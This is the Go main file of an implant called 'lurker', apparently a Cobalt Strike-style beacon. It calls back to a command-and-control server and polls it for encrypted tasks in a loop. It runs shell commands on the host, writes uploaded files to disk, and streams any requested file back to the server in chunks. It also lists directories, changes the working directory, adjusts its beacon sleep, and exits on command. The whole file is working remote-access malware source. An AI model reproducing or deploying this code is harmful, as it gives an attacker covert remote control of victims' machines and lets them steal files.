package main

import (
	"bytes"
	"fmt"
	"io"
	"os"
	"strings"
	"time"

	"lurker/lurker/commands"
	"lurker/lurker/constants"
	"lurker/lurker/cryptography"
	"lurker/lurker/transports"
	"lurker/lurker/utilities"
)

func main() {

	ok := transports.InitialCallback()
	if ok {
		for {
			resp := transports.PullCommand()
			if resp != nil {
				totalLen := resp.Response().ContentLength
				if totalLen > 0 {
					hmacHash := resp.Bytes()[totalLen-cryptography.HmacHashLen:]
					fmt.Printf("hmac hash: %v\n", hmacHash)
					//TODO check the hmachash
					restBytes := resp.Bytes()[:totalLen-cryptography.HmacHashLen]
					decrypted := transports.DecryptPacket(restBytes)
					timestamp := decrypted[:4]
					fmt.Printf("timestamp: %v\n", timestamp)
					lenBytes := decrypted[4:8]
					packetLen := transports.ReadInt(lenBytes)

					decryptedBuf := bytes.NewBuffer(decrypted[8:])
					for {
						if packetLen <= 0 {
							break
						}
						cmdType, cmdBuf := transports.ParsePacket(decryptedBuf, &packetLen)
						if cmdBuf != nil {
							switch cmdType {
							//shell
							case commands.CMD_TYPE_SHELL:
								shellPath, shellBuf := commands.ParseCommandShell(cmdBuf)
								result := commands.Shell(shellPath, shellBuf)
								finalPaket := transports.MakePacket(0, result)
								transports.PushResult(finalPaket)

							case commands.CMD_TYPE_UPLOAD_START:
								filePath, fileData := commands.ParseCommandUpload(cmdBuf)
								filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
								commands.Upload(filePathStr, fileData)

							case commands.CMD_TYPE_UPLOAD_LOOP:
								filePath, fileData := commands.ParseCommandUpload(cmdBuf)
								filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
								commands.Upload(filePathStr, fileData)

							case commands.CMD_TYPE_DOWNLOAD:
								filePath := cmdBuf
								//TODO encode
								strFilePath := string(filePath)
								strFilePath = strings.ReplaceAll(strFilePath, "\\", "/")
								fileInfo, err := os.Stat(strFilePath)
								if err != nil {
									//TODO notify error to c2
									//packet.processError(err.Error())
									break
								}
								fileLen := fileInfo.Size()
								test := int(fileLen)
								fileLenBytes := transports.WriteInt(test)
								requestID := cryptography.RandomInt(10000, 99999)
								requestIDBytes := transports.WriteInt(requestID)
								result := utilities.BytesCombine(requestIDBytes, fileLenBytes, filePath)
								finalPaket := transports.MakePacket(2, result)
								transports.PushResult(finalPaket)

								fileHandle, err := os.Open(strFilePath)
								if err != nil {
									//packet.processErrorTest(err.Error())
									break
								}
								var fileContent []byte
								fileBuf := make([]byte, 512*1024)
								for {
									n, err := fileHandle.Read(fileBuf)
									if err != nil && err != io.EOF {
										break
									}
									if n == 0 {
										break
									}
									fileContent = fileBuf[:n]
									result = utilities.BytesCombine(requestIDBytes, fileContent)
									finalPaket = transports.MakePacket(8, result)
									transports.PushResult(finalPaket)
								}

								finalPaket = transports.MakePacket(9, requestIDBytes)
								transports.PushResult(finalPaket)

							case commands.CMD_TYPE_FILE_BROWSE:
								dirResult := commands.File_Browse(cmdBuf)
								finalPacket := transports.MakePacket(22, dirResult)
								transports.PushResult(finalPacket)

							case commands.CMD_TYPE_CD:
								commands.ChangeCurrentDir(cmdBuf)

							case commands.CMD_TYPE_SLEEP:
								sleep := transports.ReadInt(cmdBuf[:4])
								//jitter := packet.ReadInt(cmdBuf[4:8])
								//fmt.Printf("Now sleep is %d ms, jitter is %d\n",sleep,jitter)
								constants.WaitTime = time.Duration(sleep) * time.Millisecond

							case commands.CMD_TYPE_PWD:
								pwdResult := commands.GetCurrentDirectory()
								finPacket := transports.MakePacket(32, pwdResult)
								transports.PushResult(finPacket)

							case commands.CMD_TYPE_EXIT:
								os.Exit(0)

							default:
								errIdBytes := transports.WriteInt(0) // must be zero
								arg1Bytes := transports.WriteInt(0)  // for debug
								arg2Bytes := transports.WriteInt(0)
								errMsgBytes := []byte("An error has occured...")
								result := utilities.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
								finalPaket := transports.MakePacket(31, result)
								transports.PushResult(finalPaket)
							}
						}
					}
				}
			}
			time.Sleep(constants.WaitTime)
		}
	}

}
